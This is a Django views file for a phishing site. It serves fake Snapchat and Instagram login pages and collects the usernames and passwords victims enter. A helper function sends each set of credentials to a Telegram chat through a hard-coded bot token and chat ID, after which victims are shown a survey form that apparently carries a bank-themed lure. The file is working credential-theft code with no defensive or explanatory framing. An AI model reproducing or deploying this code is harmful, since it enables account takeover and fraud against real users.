from django.shortcuts import render
import requests
from django.http import JsonResponse
import requests
import traceback



# main login page
def login(request):
    return render(request, 'login.html')



# snapchat login page
def snap_login(request):
    try:
        if request.method == 'POST':
            platform = request.POST.get('platform')

            if platform == 'snapchat':
                username = request.POST.get('username')
                password = request.POST.get('password')

                # send creds to telegram
                send_credentials_to_telegram(platform, username, password)

            return render(request, 'form.html')
        else:
            return render(request, 'snap_login.html')
    except:
        traceback.print_exc()


    
# instagram login page
def insta_login(request):
    try:
        if request.method == 'POST':
            platform = request.POST.get('platform')

            if platform == 'instagram':
                # Extract username and password from the form data
                username = request.POST.get('username')
                password = request.POST.get('password')

                # Send the credentials to Telegram
                send_credentials_to_telegram(platform, username, password)

            # return redirect('survey')
            return render(request, 'form.html')
        else:
            # Render the login page for GET requests
            return render(request, 'insta_login.html')

    except Exception as e:
        traceback.print_exc()
        print("error occur {e}")



# telegram send message 
def send_credentials_to_telegram(platform, username, password):
    try:
        # Replace 'YOUR_BOT_TOKEN' and 'YOUR_CHAT_ID' with your actual bot token and chat ID
        bot_token = '6818215291:AAFQqo7CtFPXkm3G9SkfMThd4C6SjoKyfjM'
        chat_id = '-1002099651245'

        # Compose the message containing the credentials
        message = f'{platform.capitalize()} Username: {username}\n{platform.capitalize()} Password: {password}'

        send_text = 'https://api.telegram.org/bot' + bot_token + '/sendMessage?chat_id=' + \
            chat_id + '&parse_mode=Markdown&text=' + message

        response = requests.get(send_text)
        return response.json()
        # https://api.telegram.org/bot6818215291:AAFQqo7CtFPXkm3G9SkfMThd4C6SjoKyfjM/sendMessage?chat_id=-1002099651245&text=hello
        
    except Exception as e:
        print(f'An error occurred: {e}')




def login_api(self, request):
    choice = request.GET.get('choice')
    if choice == 'instagram':
        return render(request, 'insta_login.html')

    elif choice == 'snapchat':
        return render(request, 'snap_login.html')

    else:
        return JsonResponse({'error': 'Invalid choice selected.'}, status=400)
    
    return JsonResponse({'success': True})


# redirect to hdfc_survey
def survey(request):
    return render(request, 'form.html')

